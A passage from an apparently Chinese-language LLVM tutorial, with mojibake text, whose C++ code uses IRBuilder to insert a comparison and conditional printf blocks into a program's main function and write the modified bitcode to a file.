punctuation">&#125;</span></code></pre><p>è¡¥å……åæ•ˆæœå¦‚ä¸‹ï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">defuatÂ·Â·Â·Â·Â·  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">16</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">17</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">18</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">19</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span>ina1 <span class="token operator">=</span> alloca <span class="token keyword">double</span><span class="token punctuation">,</span> align <span class="token number">8</span>  store <span class="token keyword">double</span> <span class="token number">1.000000e+02</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ina1<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">20</span> <span class="token operator">=</span> fadd <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token number">19</span>  <span class="token operator">%</span>inf1 <span class="token operator">=</span> fcmp ugt <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">1.000000e+02</span>  br label <span class="token operator">%</span><span class="token punctuation">.</span>splitdefaut_ret<span class="token operator">:</span>                                       <span class="token punctuation">;</span> preds <span class="token operator">=</span> <span class="token operator">%</span>defaut  <span class="token operator">%</span><span class="token number">21</span> <span class="token operator">=</span> load i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> align <span class="token number">8</span>  call <span class="token keyword">void</span> @<span class="token function">free</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">21</span><span class="token punctuation">)</span> #<span class="token number">4</span>  ret i32 <span class="token number">0</span>change_prt<span class="token operator">:</span>                                       <span class="token punctuation">;</span> defaut_prt<span class="token operator">:</span>                                       <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>Â·Â·Â·Â·Â·</code></pre><h3 id="2-4-åœ¨å—ä¸­å¡«å……å†…å®¹">2.4 åœ¨å—ä¸­å¡«å……å†…å®¹</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/**    * 2022-05-03 12:51:10    * TODO:    * ä¿®æ”¹è¾“å‡ºå—ï¼š    * è¯»å–å‰é¢å­˜å‚¨é»˜è®¤100å€¼,    * æ„é€ printfå‡½æ•°è¾“å‡º    * */</span>   builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>change_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">auto</span> in_load <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>in_alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">auto</span> i32p <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">getIntPtrTy</span><span class="token punctuation">(</span>M<span class="token operator">-></span><span class="token function">getDataLayout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">auto</span> printf_prototype <span class="token operator">=</span> <span class="token class-name">FunctionType</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>i32p<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">auto</span> printf_fn <span class="token operator">=</span> M<span class="token operator">-></span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token string">"printf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>printf_fn<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       printf_fn <span class="token operator">=</span> <span class="token class-name">Function</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>printf_prototype<span class="token punctuation">,</span>Function<span class="token double-colon punctuation">::</span>ExternalLinkage<span class="token punctuation">,</span> <span class="token string">"printf"</span><span class="token punctuation">,</span> M<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">auto</span> format_str <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateGlobalStringPtr</span><span class="token punctuation">(</span><span class="token string">"%.2f + %.2f = %.2f \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      builder<span class="token punctuation">.</span><span class="token function">CreateCall</span><span class="token punctuation">(</span>printf_fn<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>format_str<span class="token punctuation">,</span>in_prt<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>in_prt<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>in_load<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   builder<span class="token punctuation">.</span><span class="token function">CreateBr</span><span class="token punctuation">(</span>bb2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/**    * 2022-05-03 12:51:57    * TODO:    * é»˜è®¤è¾“å‡ºå—ï¼š    * æ„é€ printfé»˜è®¤å‡½æ•°è¾“å‡º    * */</span>   builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>defaut_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>   builder<span class="token punctuation">.</span><span class="token function">CreateCall</span><span class="token punctuation">(</span>printf_fn<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>format_str<span class="token punctuation">,</span>in_prt<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>in_prt<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>in_fadd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   builder<span class="token punctuation">.</span><span class="token function">CreateBr</span><span class="token punctuation">(</span>bb2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">/**    * 2022-05-03 12:52:18    * TODO:    * æ„é€ æ–°çš„brè·³è½¬æŒ‡ä»¤æ›¿æ¢é»˜è®¤åˆ†å—æŒ‡ä»¤    * br label defaue_ret -> br &lt;cond> label A lable B    * */</span>   <span class="token keyword">auto</span> old_cond_br <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>oldblk<span class="token operator">-></span><span class="token function">getIterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">rbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">auto</span> new_cond_br <span class="token operator">=</span> <span class="token class-name">BranchInst</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>change_prt<span class="token punctuation">,</span>defaut_prt<span class="token punctuation">,</span>in_fcmp<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">ReplaceInstWithInst</span><span class="token punctuation">(</span>old_cond_br<span class="token punctuation">,</span>new_cond_br<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/**    * 2022-05-03 14:54:46    * TODO:    * åˆ é™¤åŸå…ˆprintfçš„è°ƒç”¨æŒ‡ä»¤    * */</span>   in_prt<span class="token operator">-></span><span class="token function">eraseFromParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-5-ä¿®æ”¹åModuleéªŒè¯å¹¶å†™å…¥æ–‡ä»¶ä¸­">2.5 ä¿®æ”¹åModuleéªŒè¯å¹¶å†™å…¥æ–‡ä»¶ä¸­</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * #include "llvm/IR/Verifier.h" * 2022-05-02 11:43:34 * TODO: * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§ * verifyModule(*M,&amp;errs()): true if the module is broken.  * */</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">verifyModule</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: Module verify is ok \n"</span><span class="token punctuation">;</span>    <span class="token comment">// M->print(outs(),nullptr);</span><span class="token punctuation">&#125;</span><span class="token comment">/** * #include "llvm/Bitcode/BitcodeWriter.h" * 2022-05-03 12:55:33 * TODO: * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ * */</span>std<span class="token double-colon punctuation">::</span>error_code EC<span class="token punctuation">;</span>llvm<span class="token double-colon punctuation">::</span>raw_fd_ostream <span class="token function">OS</span><span class="token punctuation">(</span><span class="token string">"aftermain.bc"</span><span class="token punctuation">,</span> EC<span class="token punctuation">,</span>llvm<span class="token double-colon punctuation">::</span>sys<span class="token double-colon punctuation">::</span>fs<span class="token double-colon punctuation">::</span><span class="token function">OpenFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">WriteBitcodeToFile</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>OS<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>OS<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="2-x-å…¨éƒ¨æºç ">2.x) å…¨éƒ¨æºç </h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * 2022-04-26 01:02:37 * 2022-05-03 15:55:43 * sizaif *  * clang++ $(llvm-config --cxxflags --ldflags --system-libs --libs)  -o main main.cpp * ./main main.ll * lli aftermain.bc * */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Transforms/Utils/BasicBlockUtils.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;llvm/IR/IRBuilder.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/LLVMContext.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Module.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/InstIterator.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Instruction.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Instructions.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/InstrTypes.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IR/Verifier.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/IRReader/IRReader.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/CodeGen/MIRParser/MIRParser.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/InitLLVM.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/Debug.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/TargetSelect.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Support/SourceMgr.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;llvm/Support/raw_os_ostream.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"llvm/Bitcode/BitcodeWriter.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstdio></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> llvm<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     LLVMContext context<span class="token punctuation">;</span>    IRBuilder<span class="token operator">&lt;</span><span class="token operator">></span> <span class="token function">builder</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>Module<span class="token operator">></span> M<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>MIRParser<span class="token operator">></span> MIR<span class="token punctuation">;</span>    SMDiagnostic Err<span class="token punctuation">;</span>    <span class="token comment">/**     * #include "llvm/IRReader/IRReader.h"     * 2022-04-26 03:04:32     * TODO:     * from IR file get Moudle class     * */</span>    M <span class="token operator">=</span> <span class="token function">parseIRFile</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>Err<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"debug: M is not null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        <span class="token comment">// M->print(llvm::outs(),nullptr);</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span><span class="token string">"M is null"</span><span class="token operator">&lt;&lt;</span>std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>        Err<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 2022-04-26 03:25:52     * TODO:     * è·å–mainå‡½æ•°     * */</span>    <span class="token keyword">auto</span> main_fn <span class="token operator">=</span> M<span class="token operator">-></span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token function">StringRef</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/**     * 2022-04-28 02:14:46     * TODO:     * æ‰¾åˆ°faddæŒ‡ä»¤,ä¸faddçš„åä¸€ä¸ªæŒ‡ä»¤     * */</span>    Instruction <span class="token operator">*</span>in_fadd<span class="token punctuation">,</span><span class="token operator">*</span>in_prt<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>inst_iterator I <span class="token operator">=</span> <span class="token function">inst_begin</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">,</span> E <span class="token operator">=</span> <span class="token function">inst_end</span><span class="token punctuation">(</span><span class="token operator">*</span>main_fn<span class="token punctuation">)</span><span class="token punctuation">;</span> I <span class="token operator">!=</span> E<span class="token punctuation">;</span> <span class="token operator">++</span>I<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>I<span class="token operator">-></span><span class="token function">isBinaryOp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> I<span class="token operator">-></span><span class="token function">getOpcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>Instruction<span class="token double-colon punctuation">::</span>FAdd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// outs() &lt;&lt; *I &lt;&lt; "\n";</span>            in_fadd <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span>I<span class="token punctuation">;</span>            in_prt <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token punctuation">(</span>I<span class="token punctuation">.</span><span class="token keyword">operator</span><span class="token operator">++</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">/**     * 2022-04-28 02:42:32     * TODO:     * %20 = load double, double* %5, align 8     * %21 = fadd double %19, %20     * åœ¨faddæŒ‡ä»¤å‰é¢     * æ·»åŠ ä»¥ä¸‹ä¸¤ä¸ªæŒ‡ä»¤:     * &lt;x>  = alloca double, align 8     * store double 1.000000e+02, double* &lt;x>, align 8     *      * */</span>    <span class="token keyword">auto</span> f32 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">getDoubleTy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> const100 <span class="token operator">=</span> <span class="token class-name">ConstantFP</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token keyword">double</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_fadd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_alloc <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateAlloca</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"ina1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_store <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateStore</span><span class="token punctuation">(</span>const100<span class="token punctuation">,</span>in_alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 2022-05-03 12:47:30     * TODO:     * åœ¨printfæŒ‡ä»¤å‰æ·»åŠ æ¡ä»¶åˆ¤æ–­(fcmp)æŒ‡ä»¤     * %21 = call i32 (i8*, ...) @printf(i8* noundef Â·Â·Â·Â·     * fcmp:     * &lt;x> = fcmp ugt double &lt;fadd>, 1.000000e+02     * */</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_fcmp <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateFCmpUGT</span><span class="token punctuation">(</span>in_fadd<span class="token punctuation">,</span>const100<span class="token punctuation">,</span><span class="token string">"inf1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: fadd op : "</span><span class="token operator">&lt;&lt;</span><span class="token operator">*</span>in_fadd<span class="token operator">&lt;&lt;</span><span class="token string">" \n"</span><span class="token punctuation">;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: alloc op : "</span><span class="token operator">&lt;&lt;</span><span class="token operator">*</span>in_alloc<span class="token operator">&lt;&lt;</span><span class="token string">" \n"</span><span class="token punctuation">;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: store op : "</span><span class="token operator">&lt;&lt;</span><span class="token operator">*</span>in_store<span class="token operator">&lt;&lt;</span><span class="token string">" \n"</span><span class="token punctuation">;</span>    <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: fcmp op : "</span><span class="token operator">&lt;&lt;</span><span class="token operator">*</span>in_fcmp<span class="token operator">&lt;&lt;</span><span class="token string">" \n"</span><span class="token punctuation">;</span>        <span class="token comment">/**     * 2022-05-03 12:49:38     * TODO:     * å°†mainä¸­é»˜è®¤å—åˆ†ä¸º2å—: ä¸»ä½“å—å’Œé»˜è®¤retå—     * å¹¶æ·»åŠ ä¸¤ä¸ªæ–°å—: ä¿®æ”¹è¾“å‡ºå—å’Œé»˜è®¤è¾“å‡ºå—     * */</span>    <span class="token keyword">auto</span> oldblk <span class="token operator">=</span> <span class="token operator">&amp;</span>main_fn<span class="token operator">-></span><span class="token function">getEntryBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    oldblk<span class="token operator">-></span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"defaut"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> bb2 <span class="token operator">=</span> <span class="token function">SplitBlock</span><span class="token punctuation">(</span>oldblk<span class="token punctuation">,</span>in_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>bb2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: split block wrong! \n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        bb2<span class="token operator">-></span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"defaut_ret"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        BasicBlock <span class="token operator">*</span>change_prt <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"change_prt"</span><span class="token punctuation">,</span> main_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    BasicBlock <span class="token operator">*</span>defaut_prt <span class="token operator">=</span> <span class="token class-name">BasicBlock</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> <span class="token string">"defaut_prt"</span><span class="token punctuation">,</span> main_fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 2022-05-03 12:51:10     * TODO:     * ä¿®æ”¹è¾“å‡ºå—ï¼š     * è¯»å–å‰é¢å­˜å‚¨é»˜è®¤100å€¼,     * æ„é€ printfå‡½æ•°è¾“å‡º     * */</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>change_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_load <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>in_alloc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> i32p <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">getIntPtrTy</span><span class="token punctuation">(</span>M<span class="token operator">-></span><span class="token function">getDataLayout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> printf_prototype <span class="token operator">=</span> <span class="token class-name">FunctionType</span><span class="token double-colon punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span>i32p<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> printf_fn <span class="token operator">=</span> M<span class="token operator">-></span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token string">"printf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>printf_fn<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        printf_fn <span class="token operator">=</span> <span class="token class-name">Function</span><span class="token double-colon punctuation">::</span><span class="token function">Create</span><span class="token punctuation">(</span>printf_prototype<span class="token punctuation">,</span>Function<span class="token double-colon punctuation">::</span>ExternalLinkage<span class="token punctuation">,</span> <span class="token string">"printf"</span><span class="token punctuation">,</span> M<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">auto</span> format_str <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateGlobalStringPtr</span><span class="token punctuation">(</span><span class="token string">"%.2f + %.2f = %.2f \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        builder<span class="token punctuation">.</span><span class="token function">CreateCall</span><span class="token punctuation">(</span>printf_fn<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>format_str<span class="token punctuation">,</span>in_prt<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>in_prt<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>in_load<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    builder<span class="token punctuation">.</span><span class="token function">CreateBr</span><span class="token punctuation">(</span>bb2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/**     * 2022-05-03 12:51:57     * TODO:     * é»˜è®¤è¾“å‡ºå—ï¼š     * æ„é€ printfé»˜è®¤å‡½æ•°è¾“å‡º     * */</span>    builder<span class="token punctuation">.</span><span class="token function">SetInsertPoint</span><span class="token punctuation">(</span>defaut_prt<span class="token punctuation">)</span><span class="token punctuation">;</span>    builder<span class="token punctuation">.</span><span class="token function">CreateCall</span><span class="token punctuation">(</span>printf_fn<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>format_str<span class="token punctuation">,</span>in_prt<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>in_prt<span class="token operator">-></span><span class="token function">getOperand</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>in_fadd<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    builder<span class="token punctuation">.</span><span class="token function">CreateBr</span><span class="token punctuation">(</span>bb2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/**     * 2022-05-03 12:52:18     * TODO:     * æ„é€ æ–°çš„brè·³è½¬æŒ‡ä»¤æ›¿æ¢é»˜è®¤åˆ†å—æŒ‡ä»¤     * br label defaue_ret -> br &lt;cond> label A lable B     * */</span>    <span class="token keyword">auto</span> old_cond_br <span 